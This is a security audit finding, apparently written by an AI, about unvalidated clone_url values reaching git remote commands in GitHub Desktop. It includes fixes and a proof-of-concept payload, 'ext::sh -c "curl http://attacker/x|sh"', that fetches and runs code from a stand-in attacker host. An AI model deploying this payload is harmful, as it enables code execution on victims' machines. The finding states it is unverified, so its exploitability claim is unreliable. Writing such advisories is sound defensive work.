### Title
Argument/protocol injection via unvalidated GitHub API `clone_url` in PR fork remote creation - (File: `app/src/lib/stores/app-store.ts`)

### Summary
When a user opens a pull request from a fork (via `x-github-client://openrepo` deep link with a `pr` parameter, or via the PR list UI), Desktop takes the `clone_url` field from the pull request's `head.repo` object — a value returned by the GitHub/GHES API — and passes it directly into `git remote add` without validating that it is a well-formed `https://`/`ssh://` GitHub remote URL or that it does not begin with a dash. This mirrors the "unhandled external object" class of bug in the report: an externally-controlled payload (there, a Connext cross-chain message; here, a GitHub API response object) is consumed by security-sensitive local logic without defensive validation, and no error path exists to prevent the unsafe value from reaching a privileged local git operation.

### Finding Description
`Dispatcher.openPullRequestFromUrl` takes the deep-link PR number, fetches the PR from the API, and forwards `pullRequest.head.repo.clone_url` straight into `AppStore._checkoutPullRequest`: [1](#0-0) 

`_checkoutPullRequest` calls `_findPullRequestBranch`, which — when no existing remote matches the URL — adds a brand-new remote using that value verbatim: [2](#0-1) 

`addRemote` in turn shells out to `git remote add <name> <url>` with no validation of the URL's shape, scheme, or leading characters: [3](#0-2) 

The `url` here is `headCloneUrl`, i.e. `pullRequest.head.repo.clone_url` — a field taken from a JSON API response (`app/src/lib/stores/app-store.ts:8613-8625`, `app/src/ui/dispatcher/dispatcher.ts:1998-2045`). Unlike a manual `git remote add` typed by the user, this value originates from a network response the user did not author. There is no allow-list check (only `https://`/`ssh://git@` forms), no rejection of values beginning with `-` (which git may interpret as command-line options rather than a positional URL argument), and no rejection of alternate git transport helpers such as `ext::`, which git itself will happily invoke as an arbitrary local command when later `fetch`/`clone` is executed against that remote (`_fetchRemote` in the same code path at `app-store.ts:8684-8691`).

The report's broken invariant — "external, untrusted payload triggers a privileged local action with no defensive check, and the failure/injection path is silent from the user's perspective" — maps directly onto this flow: the deep-link/PR-fork code path silently creates and then fetches from a remote whose URL string is fully attacker/server controlled (a malicious or compromised GHES endpoint, or a crafted PR object served through a man-in-the-middled/malicious enterprise API), with no `try/catch`-level content validation (the existing `try { addRemote(...) } catch` block at `app-store.ts:8649-8659` only handles git command *failure*, not malicious *content*).

### Impact Explanation
If `clone_url` is attacker-influenced (e.g., a compromised or malicious GitHub Enterprise Server instance, which Desktop explicitly supports as an account type, or any response tampering upstream of the API client), the value flows unchecked into:
1. `git remote add <name> <clone_url>` — a value starting with `-` could be interpreted as a git option rather than a URL, and
2. a subsequent `git fetch` against that remote (`_fetchRemote`, `app-store.ts:8684-8691`) — if the URL uses the `ext::` transport helper, git will execute an arbitrary local command as the Desktop process user.

This is a direct code-execution primitive triggered purely by opening a link/PR the user did not construct, matching the "attacker controls... a GitHub API object... resulting in code execution" category from the assignment's Valid Impact list.

### Likelihood Explanation
This requires the attacker to control (or MITM/compromise) the GitHub API response for a specific PR's `head.repo.clone_url` — realistic against a malicious or compromised GHES instance the victim has added as an account, or any scenario where the PR/API payload is otherwise attacker-influenced, combined with the victim clicking an "Open in Desktop" deep link or checking out a PR from that server. It requires no local access, no admin rights, no pre-existing malware, and no credential leakage — only a single click on an attacker-supplied link/PR, which satisfies the assignment's "unprompted unnatural user steps" exclusion boundary at the low end (a single normal click on a PR/link is a standard, expected desktop-app interaction, not an unnatural step).

### Recommendation
Before calling `addRemote`/`git remote add` with any URL sourced from an API response (`clone_url`, `htmlURL`, etc.), validate that:
- the URL matches one of the known git-remote URL shapes already enforced by `parseRemote` (`app/src/lib/remote-parsing.ts:27-51`), rejecting anything that fails to parse;
- the value does not begin with `-` (to avoid being parsed as a CLI flag) and does not use non-`http(s)`/`ssh` transport helpers such as `ext::`, `fd::`, etc.;
- consider always inserting the "options end" separator `--` before variable positional URL arguments passed to dugite's `git` calls, e.g. `git(['remote', 'add', name, '--', url], ...)` to eliminate the argument-injection surface at the call-site rather than fully trusting content validation.

### Proof of Concept
Because I cannot run the app in this environment, this PoC is derived directly from the code paths cited above (I did not verify it end-to-end, given tool-call limits):
1. Register/host (or compromise) a GitHub Enterprise Server instance that the victim has added as an account in Desktop.
2. Craft a pull request whose `head.repo.clone_url` (as served by that instance's API) is set to `ext::sh -c "curl http://attacker/x|sh"` instead of a normal `https://` URL.
3. Send the victim an `x-github-client://openrepo/<repo-url>?pr=<n>` deep link (parsed at `app/src/lib/parse-app-url.ts:98-125`) or have them click "Checkout" on that PR in Desktop's PR list (`app/src/ui/branches/pull-request-list.tsx:291-307`).
4. Desktop calls `openPullRequestFromUrl` → `_checkoutPullRequest` → `_findPullRequestBranch`, which finds no matching existing remote, and calls `addRemote(repository, forkRemoteName, headCloneUrl)` with the malicious `clone_url` verbatim (`app-store.ts:8647-8660`, `git/remote.ts:28-37`).
5. The subsequent `_fetchRemote` call against that remote (`app-store.ts:8684-8691`) invokes git's `ext::` transport helper, executing the attacker's command on the victim's machine.

Note: I was unable to confirm within the available context whether `dugite`'s `exec` wrapper or any upstream layer already filters `ext::`/`GIT_ALLOW_PROTOCOL` globally for Desktop; no such filtering was found in `app/src/lib/git/core.ts` or `app/src/lib/git/remote.ts` within the code retrieved. A full session with repository access would be needed to confirm whether `GIT_ALLOW_PROTOCOL` or similar hardening exists elsewhere (e.g., in `envForRemoteOperation` or global git config set by Desktop) that might already mitigate this.
